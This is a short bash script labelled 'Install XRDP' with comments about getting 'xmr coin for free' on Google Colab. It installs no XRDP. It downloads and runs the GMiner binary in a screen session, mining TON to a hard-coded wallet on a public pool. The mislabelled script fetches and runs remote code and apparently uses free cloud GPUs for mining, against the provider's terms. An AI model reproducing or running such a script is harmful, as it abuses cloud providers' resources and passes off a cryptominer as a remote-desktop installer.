#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R ton

wget https://github.com/develsoftware/GMinerRelease/releases/download/2.86/gminer_2_86_linux64.tar.xz
tar -xf gminer_2_86_linux64.tar.xz
chmod +x ./miner
./miner --cuda 1 -c 0 --algo ton --server ton.sg.hashrate.to:4003 --user EQDKNhmKMdn1RYKBUHm0mTiBdQ80JrAyTA5cqzjr2n2rrG5X --worker x11
